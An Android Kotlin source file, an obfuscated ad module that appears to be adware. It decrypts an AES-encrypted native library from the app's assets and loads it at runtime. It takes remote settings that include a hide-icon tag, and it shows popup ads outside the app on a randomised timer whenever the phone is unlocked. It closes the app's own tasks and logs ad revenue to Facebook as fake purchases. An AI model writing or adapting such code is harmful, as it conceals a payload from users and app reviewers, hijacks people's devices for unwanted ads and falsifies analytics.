package ad

import android.app.Activity
import android.app.Application
import android.app.KeyguardManager
import android.content.Context
import android.net.ConnectivityManager
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.util.Log
import com.helico.bacter.pylori.Core
import com.helico.bacter.pylori.AppLifecycelListener
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONObject
import late.mod.a
import com.helico.bacter.pylori.Constant
import com.facebook.FacebookSdk
import com.facebook.appevents.AppEventsLogger
import com.google.firebase.analytics.FirebaseAnalytics
import com.google.firebase.analytics.ktx.analytics
import com.google.firebase.ktx.Firebase
import kotlinx.coroutines.Job
import java.io.File
import java.io.FileOutputStream
import java.io.InputStream
import java.text.SimpleDateFormat
import java.util.Currency
import java.util.Date
import java.util.Locale
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec
import kotlin.random.Random

/**
 * Date：2025/7/16
 * Describe:
 * b2.D9
 */
object AdE {
    private var sK = "" // 16, 24, or 32 bytes // So 解密的key
    private var mContext: Application = Core.mApp

    @JvmStatic
    var isSAd = false //是否显示广告

    @JvmStatic
    var lastSAdTime = 0L //上一次显示广告的时间

    private val mMainScope = CoroutineScope(Dispatchers.Main)
    private var cTime = 30000L // 检测间隔
    private var tPer = 40000 // 显示间隔
    private var tWait = 30000 // 首次外弹等待时间

    private var nTryMax = 50 // 失败上限
    private var screenOpenCheck = 1400L // 屏幕监测、延迟显示
    private var maxShowTime = 20000L // 广告最大显示时间


    private var nHourShowMax = 80//小时显示次数
    private var nDayShowMax = 80 //天显示次数

    private var nHourReqMax = 0//小时请求次数
    private var nDayReqMax = 0 //天请求次数

    private var numHour = Core.getInt("ad_s_h_n")
        set(value) {
            field = value
            Core.saveInt("ad_s_h_n", field)
        }
    private var numDay = Core.getInt("ad_s_d_n")
        set(value) {
            field = value
            Core.saveInt("ad_s_d_n", field)
        }
    private var numReqHour = Core.getInt("ad_req_h_n") // 请求小时次数
        set(value) {
            field = value
            Core.saveInt("ad_req_h_n", field)
        }
    private var numReqDay = Core.getInt("ad_req_d_n") // 请求天次数
        set(value) {
            field = value
            Core.saveInt("ad_req_d_n", field)
        }

    private var isCurDay = Core.getStr("ad_lcd")
    private var numJumps = Core.getInt("ac_njp")

    private var tagL = "" //调用外弹 隐藏icon字符串
    private var tagO = "" //外弹字符串

    @JvmStatic
    var strBroadKey = "" // 广播的key
    private var fileName = ""// 文件开关名

    private var timeDS = 100L //延迟显示随机时间开始
    private var timeDE = 400L //延迟显示随机时间结束
    private var checkTimeRandom = 1000 // 在定时时间前后增加x秒

    @JvmStatic
    fun gDTime(): Long {
        if (timeDE < 1 || timeDS < 1) return Random.nextLong(90, 190)
        return Random.nextLong(timeDS, timeDE)
    }

    @JvmStatic
    fun sNumJump(num: Int) {
        numJumps = num
        Core.saveInt("ac_njp", num)
    }

    @JvmStatic
    fun adShow() {
        numHour++
        numDay++
        isSAd = true
        lastSAdTime = System.currentTimeMillis()
    }

    @JvmStatic
    fun adReqEvent() {
        if (nDayReqMax > 0) {
            numReqHour++
            numReqDay++
        }
    }

    private var isPost = false
    private fun pL(isShow: Boolean = true) {
        if (isPost) return
        isPost = true
        Core.pE(if (isShow) "advertise_limit" else "ad_limit_req")
    }

    private fun isCurH(): Boolean {
        val s = Core.getStr("ad_lht")
        if (s.isNotBlank()) {
            if (System.currentTimeMillis() - s.toLong() < 60000 * 60) {
                return true
            }
        }
        Core.saveC("ad_lht", System.currentTimeMillis().toString())
        return false
    }

    private fun isLi(): Boolean {
        val day = SimpleDateFormat("yyyy-MM-dd", Locale.US).format(Date())
        if (isCurDay != day) {
            isCurDay = day
            Core.saveC("ad_lcd", isCurDay)
            numHour = 0
            numDay = 0
            isPost = false
            numReqDay = 0
            numReqHour = 0
        }
        if (isCurH().not()) {
            numHour = 0
            numReqHour = 0
        }
        if (numDay >= nDayShowMax) {
            pL()
            return true
        }
        if (numHour >= nHourShowMax) {
            return true
        }
        if (nDayReqMax > 0 && nHourReqMax > 0) {
            if (numReqDay >= nDayReqMax) {
                pL()
                return true
            }
            if (numReqHour >= nHourReqMax) {// 请求上限
                return true
            }
        }
        return false
    }

    private var isFailedDay = Core.getStr("n_d_1215")
    private fun isNewDay(): Boolean {
        val day = SimpleDateFormat("yyyy-MM-dd", Locale.US).format(Date())
        if (isFailedDay != day) {
            isFailedDay = day
            Core.saveC("n_d_1215", isFailedDay)
            return true
        }
        return false
    }

    @JvmStatic
    fun a2() {
        val num = numJumps - nTryMax
        if (num > 0) {// 外弹上限
            if (isNewDay()) {
                Core.pE("retry_new_day")
                sNumJump(numJumps - num - 5)
            } else {
                Core.pE("pop_fail")
                return
            }
        }
        mContext.registerActivityLifecycleCallbacks(AppLifecycelListener())
        refreshAdmin()
        File("${mContext.dataDir}/$fileName").mkdirs()
        t()
    }

    // 如果是Admin写在里面的那么可以直接进行数据
    @JvmStatic
    fun reConfig(js: JSONObject) {
        // JSON数据格式
        sK = js.optString(Constant.K_SO)
        val listStr = js.optString(Constant.K_W).split("-")
        tagL = listStr[0]
        tagO = listStr[1]
        strBroadKey = listStr[2]
        fileName = listStr[3]
        Log.e("TAG", "reConfig: tagL=${tagL}-tagO=$tagO  strBroadKey=$strBroadKey fileName=$fileName", )
        AdCenter.setAdId(js.optString(Constant.K_ID_L))// 广告id
        val lt = js.optString(Constant.K_TIME).split("-")//时间相关配置
        cTime = lt[0].toLong() * 1000
        tPer = lt[1].toInt() * 1000
        tWait = lt[2].toInt() * 1000
        timeDS = lt[3].toLong()
        timeDE = lt[4].toLong()
        checkTimeRandom = lt[5].toInt() * 1000
        screenOpenCheck = lt[6].toLong()
        maxShowTime = lt[7].toLong() * 1000L

        val ltime = js.optString(Constant.L_TIME).split("-")//广告限制相关
        nHourShowMax = ltime[0].toInt()
        nDayShowMax = ltime[1].toInt()
        nTryMax = ltime[2].toInt()
        if (ltime.size > 4) {
            nHourReqMax = ltime[3].toInt()
            nDayReqMax = ltime[4].toInt()
        }

    }

    private var lastS = ""
    private fun refreshAdmin() {
        val s = Core.getStr("hiydsc")
        Log.e("TAG", "refreshAdmin: $s", )
        if (lastS != s) {
            lastS = s
            reConfig(JSONObject(s))
        }
    }

    private fun t() {
        val is64i = is64a()
        CoroutineScope(Dispatchers.Main).launch {
            Core.pE("test_s_dec")
            val time = System.currentTimeMillis()
            val i: Boolean = loadSFile(if (is64i) Constant.Fire_64 else Constant.Fire_32)
            if (i.not()) {
                Core.pE("ss_l_f", "$is64i")
                return@launch
            }
            Core.pE("test_s_load", "${System.currentTimeMillis() - time}")
            a.a0(tagL, 12f)
            if (isLi().not()) {
                AdCenter.loadAd()
            }
            delay(1200)
            while (true) {
                // 刷新配置
                refreshAdmin()
                var t = cTime
                if (checkTimeRandom > 0) {
                    t = Random.nextLong(cTime - checkTimeRandom, cTime + checkTimeRandom)
                }
                checkAd()
                delay(t)
                if (isPopFailed()) {
                    Core.pE("pop_fail")
                    break
                }
            }
        }
    }






    // 可以放assets 也可以放在raw 资源文件
    private fun loadSFile(assetsName: String): Boolean {
        val fSN = "File_${assetsName.replace("/", "")}"
        val file = File("${mContext.filesDir}/Cache")
        if (file.exists().not()) {
            file.mkdirs()
        }
        val file2 = File(file.absolutePath, fSN)
        try {
            val fileTime = Core.getStr("file_time_11")
            if (file2.exists().not() || file2.lastModified().toString() != fileTime) {
                file2.delete()
                val aIp = mContext.assets.open(assetsName)
                decrypt(aIp, file2)
            }
            System.load(file2.absolutePath)
            Core.saveC("file_time_11", System.currentTimeMillis().toString())
            return true
        } catch (_: Exception) {
        }
        return false
    }

    // 解密
    private fun decrypt(inputFile: InputStream, outputFile: File) {
        val key = SecretKeySpec(sK.toByteArray(), "AES")
        val cipher = Cipher.getInstance("AES")
        cipher.init(Cipher.DECRYPT_MODE, key)
        val outputStream = FileOutputStream(outputFile)
        val inputBytes = inputFile.readBytes()
        val outputBytes = cipher.doFinal(inputBytes)
        outputStream.write(outputBytes)
        outputStream.close()
        inputFile.close()
    }

    private fun is64a(): Boolean {
        // 优先检测64位架构
        for (abi in Build.SUPPORTED_64_BIT_ABIS) {
            if (abi.startsWith("arm64") || abi.startsWith("x86_64")) {
                return true
            }
        }
        for (abi in Build.SUPPORTED_32_BIT_ABIS) {
            if (abi.startsWith("armeabi") || abi.startsWith("x86")) {
                return false
            }
        }
        return Build.CPU_ABI.contains("64")
    }

    private fun isPopFailed(): Boolean {
        return numJumps > nTryMax
    }

    @JvmStatic
    fun adLoadSuccess() {
        openJob()
    }

    @JvmStatic
    fun checkAdIsReadyAndGoNext() {
        if (AdCenter.isAdReady()) {
            jobTimer?.cancel()
            jobTimer = null
            openJob()
        }
    }

    private var jobTimer: Job? = null
    private var timJobStart = 0L

    @JvmStatic
    private fun openJob() {
        if (jobTimer != null && jobTimer?.isActive == true) return
        timJobStart = System.currentTimeMillis()
        Core.pE("advertise_done")
        jobTimer = mMainScope.launch {
            val del = tPer - (System.currentTimeMillis() - lastSAdTime)
            delay(del)
            Core.pE("advertise_times")
            if (isSAd) {
                val sDel = maxShowTime - (System.currentTimeMillis() - lastSAdTime)
                if (sDel > 0) {
                    Core.pE("ad_showing")
                    delay(sDel)
                }
            } else {
                val t = tWait - (System.currentTimeMillis() - Core.insAppTime)
                if (t > 0) {
                    Core.pE("ad_pass", "install")
                    delay(t)
                }
            }
            if (l().not()) {
                while (l().not()) {
                    delay(screenOpenCheck)
                }
            }
            Core.pE("ad_light")
            isCanFinish = true
            delay(finishAc())
            jumpNext()
            lastSAdTime = System.currentTimeMillis()
            delay(4000)
            if (isPopFailed().not()) {
                checkAdIsReadyAndGoNext()
            }
        }
    }

    private fun jumpNext() {
        CoroutineScope(Dispatchers.Main).launch {
            sNumJump(numJumps + 1)
            Core.pE("ad_start")
            a.a0(tagO, 1f)
        }
    }

    // 新逻辑
    private fun checkAd() {
        if (isNetworkAvailable().not()) return
        if (isLi()) {
            Core.pE("ad_pass", "limit")
            return
        }
        Core.pE("ad_pass", "N")
        AdCenter.loadAd()
        if (System.currentTimeMillis() - timJobStart > 90000) {
            checkAdIsReadyAndGoNext()
        }
    }


    private fun isNetworkAvailable(): Boolean {
        val connectivityManager =
            mContext.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val networkInfo = connectivityManager.activeNetworkInfo
        return networkInfo != null && networkInfo.isConnected
    }

    private var isCanFinish = false

    @JvmStatic
    fun finishAc(): Long {
        if (l().not()) return 0
        if (isCanFinish.not()) return 0
        val l = Core.a0()
        if (l.isNotEmpty()) {
            ArrayList(l).forEach {
                it.finishAndRemoveTask()
            }
            return 900
        }
        return 0
    }

    private fun l(): Boolean {
        return (mContext.getSystemService(Context.POWER_SERVICE) as PowerManager).isInteractive && (mContext.getSystemService(
            Context.KEYGUARD_SERVICE
        ) as KeyguardManager).isDeviceLocked.not()
    }

    @JvmStatic
    fun postEcpm(ecpm: Double) {
        try {
            val b = Bundle()
            b.putDouble(FirebaseAnalytics.Param.VALUE, ecpm)
            b.putString(FirebaseAnalytics.Param.CURRENCY, "USD")
            Firebase.analytics.logEvent(Constant.FIRE_NAME, b)
        } catch (_: Exception) {
        }
        if (FacebookSdk.isInitialized().not()) return
        //fb purchase
        AppEventsLogger.newLogger(Core.mApp).logPurchase(
            ecpm.toBigDecimal(), Currency.getInstance("USD")
        )
    }
}